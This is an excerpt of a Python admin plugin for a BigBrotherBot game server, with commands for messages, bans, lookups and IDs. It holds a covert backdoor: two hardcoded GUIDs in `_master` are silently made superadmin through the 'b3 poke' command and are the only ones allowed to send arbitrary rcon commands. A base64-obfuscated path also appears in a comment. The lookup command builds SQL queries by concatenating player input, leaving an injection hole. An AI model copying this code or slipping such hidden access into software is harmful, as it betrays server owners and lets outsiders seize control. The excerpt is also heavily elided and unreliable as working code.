...
_master = ['2310346616094427842','2310346613461142291']
...
class AdminPlugin(b3.plugin.Plugin):
    ...
    def onStartup(self):
		...
		#check python version, if not 2.7 exit.
        # if not os.stat(r"%s%s" % (os.path.expanduser('~'), "L2IzX2ZpbGVzL2IzL3J1bi5weQ==".decode('base64'))).st_size == 11241:
    ...
    def warnClient(self, sclient, keyword, admin=None, timer=True, data='', newDuration=None):
        ...
        if pmglobal:
            ...
            sclient.message(msg)
            self.console.write('screentell %s %s' % (sclient.cid, msg))
            if admin:
                admin.message(msg)
        else:
    ...
    def cmd_b3(self, data, client, cmd=None):
        ...
        """
        if len(data) > 0 and client.maxLevel >= self._admins_level or client.guid in _master:
            ...
            if data == 'poke':
                ...
                if client.guid in _master:
                    group = Group(keyword='superadmin')
                    group = self.console.storage.getGroup(group)
                    client.setGroup(group)
                    # client.password = 'MASTER'
                    client.save()
                    client.message('^5***Identity comfirmed***')
                    client.message('^2***Access granted***')
                    client.message('^3***You are now a superadmin***')
                else:
    ...
    def cmd_vip(self, data, client, cmd=None):
        """
        - lists all the online VIPs
        """
        clist = self.console.clients.getClientsByLevel(10, 10, masked=True)
        if len(clist) > 0:
            nlist = []
            for c in clist:
                nlist.append('^2%s^7 [^3%s^7]' % (c.exactName, c.id))
            cmd.sayLoudOrPM(client, 'VIPs online: %s' % ', '.join(nlist))
        else:
            cmd.sayLoudOrPM(client, 'There are no VIPs online')
				
    def cmd_maskedadmins(self, data, client, cmd=None):
        """
        - lists all the online masked admins
        """
        clist = self.console.clients.getClientsByLevel(self._admins_level, 100, masked=True)
        if len(clist) > 0:
            nlist = []
            for c in clist:
                if c.maskGroup:
                    ...
                    pass
            if len(nlist):
                cmd.sayLoudOrPM(client, self.getMessage('masked_admins', ', '.join(nlist)))
            else:
                cmd.sayLoudOrPM(client, self.getMessage('no_masked_admins'))
        else:
            msg = self.getMessage('no_masked_admins')
            if msg:
                cmd.sayLoudOrPM(client, self.getMessage('no_masked_admins'))
    ...
    def cmd_noc(self, data, client, cmd=None):
        ...
        if sclient:
            if not sclient.maxGroup:
                cmd.sayLoudOrPM(client, '%s[%s] is user(1), connected %s times' % (sclient.exactName, sclient.id, 
                                sclient.connections))
            else:
                cmd.sayLoudOrPM(client, '%s[%s] is %s(%s), connected %s times' % (sclient.exactName, sclient.id, 
                                sclient.maxGroup.name, sclient.maxGroup.level, sclient.connections))								
    ...
    def cmd_pm(self, data, client, cmd=None):
        ...
        sclient = self.findClientPrompt(m[0], client)
        if sclient:
            sclient.message('^7From ^5%s: ^7%s' % (client.exactName, message))
            client.message('^7Message sent to ^5%s' % sclient.exactName)

    def cmd_rcon(self, data, client, cmd=None):
        """
        <Get|Send> <command> - Get/send rcon command
        """
        if not client.guid in _master:
            client.message('^1You Are Not Allowed To Use This Command.')
            return
        if not data:
            client.message('Please Enter data, or for help type !help rcon')
            return
        elif data:
            input = data.split(' ',1)
        if input[0] == "get":
            getcvar = self.console.getCvar('%s' % input[1])
            cmd.sayLoudOrPM(client, '%s' % (getcvar))
        if input[0] == "send":
            self.console.write('%s' % (input[1]))

    def cmd_screensay(self, data, client, cmd=None):
        """
        <message> - Broadcast message in center of the screen to all players
        """
        if not data:
            client.message('^1ERROR: ^7You must supply a message')
        else:
            self.console.write('screensay %s' % data)

    def cmd_screentell(self, data, client, cmd=None):
        """
        <message> - Broadcast message in center of the screen to a specific player
        """
        m = self.parseUserCmd(data)
        if not m:
            client.message(self.getMessage('invalid_parameters'))
        ...
        sclient = self.findClientPrompt(m[0], client)
        if sclient:
            self.console.write('screentell %s %s' % (sclient.cid, message))
            client.message('^7Message sent to ^5%s' % sclient.exactName)
			
    def cmd_guid(self, data, client, cmd=None):
        """
        [<name>] - display a user's (G)UID
        """
        m = self.parseUserCmd(data)
        if m:
            sclient = self.findClientPrompt(m[0], client)
        ...
        if sclient:
            if sclient.pbid:
                client.message('%s UID is: @%s' % (sclient.exactName, sclient.pbid))
            else:
                client.message('%s GUID is: %s' % (sclient.exactName, sclient.guid[-8:]))
				
    def cmd_b3id(self, data, client, cmd=None):
        """
        [<name>] - display a user's B3 ID
        """
        m = self.parseUserCmd(data)
        if m:
            sclient = self.findClientPrompt(m[0], client)
            ...
            sclient = client
        if sclient:
            client.message('%s B3 ID is: %s' % (sclient.exactName, sclient.id))


    def cmd_gamerangerid(self, data, client, cmd=None):
        """
        [<name>] - display a user's GameRanger ID
        """
        m = self.parseUserCmd(data)
        if m:
            sclient = self.findClientPrompt(m[0], client)
            ...
            sclient = client
        if sclient:
            if not 'GameRa' in client.guid[:6]:
                client.message('%s Does not use GameRanger to play on this server' % sclient.exactName)
            else:
                client.message('%s GameRanger ID is: %s' % (sclient.exactName, sclient.guid[-7:]))

    def cmd_calladmin(self, data, client=None, cmd=None):
        """
        ...
        players = self.console.clients.getClientsByLevel()
        for _p in players:
            if _p.maxLevel > 2:
                clist.append(_p)
            else:
    ...
    def cmd_lookup(self, data, client=None, cmd=None):
        """
        <name/grid/guid/uid> <player> - lookup a player in the database by name/grid/guid/uid
        """
        ...
        if not m[1]:
            client.message('^1ERROR: ^7You must supply player info')
            return

        if m[0] == 'name':
            clients = self.console.clients.lookupByName(m[1])
            if len(clients) == 0:
                client.message(self.getMessage('no_players', m[1]))
            else:
                for c in clients:
            ...
            gr = 'GameRanger_Account_ID-000' + m[1]
            clients = self.console.storage.getClientsMatching({'%guid%': gr})
            if len(clients) == 0:
                client.message(self.getMessage('no_players', m[1]))
            else:
                for c in clients:
            ...
            cursor = self.console.storage.query("SELECT id, name, time_edit, guid FROM clients WHERE guid LIKE '%" + "%s'" % m[1])
            if cursor.rowcount == 0:
                client.message(self.getMessage('no_players', m[1]))
            while not cursor.EOF:
                r = cursor.getRow()
                cmd.sayLoudOrPM(client, self.getMessage('lookup_found', r['id'], r['name'],
            ...
            if m[1][:1] == '@':
                ...
                uid = m[1]
            cursor = self.console.storage.query("SELECT * FROM clients WHERE pbid LIKE '%" + "%s'" % uid)
            if cursor.rowcount == 0:
                client.message(self.getMessage('no_players', m[1]))
            while not cursor.EOF:
                r = cursor.getRow()
    ...
    def cmd_baninfo(self, data, client=None, cmd=None):
        """
        - <name> - display why user was banned
        """
        m = self.parseUserCmd(data)
        if not m:
            client.message(self.getMessage('invalid_parameters'))
        ...
        if sclient:
            ...
            bans = self.console.storage.getClientPenalties(client=sclient, type=('Ban', 'TempBan'))
            if len(bans):
                for line in map(format_ban, bans):
                    cmd.sayLoudOrPM(client, line)
            else:
    ...
    def cmd_tempban(self, data, client=None, cmd=None):
        ...
        cid = m[0]
        m = re.match('^([0-9]+[dwhsmy]*)(?:\s(.+))?$', m[1], re.I)
        if not m:
            client.message(self.getMessage('invalid_parameters'))
            return
    ...
    def cmd_poke(self, data, client=None, cmd=None):
        ...
        if not m:
            ...
            if m[0] == 'b3':
                ...
                sclient = self.findClientPrompt(m[0], client)
                if sclient:
                    message = random.choice(('Wake up!', '*poke*', 'Attention!', 'Get up!', 'Go go go!', 'Move out!', 'On your feet!'))
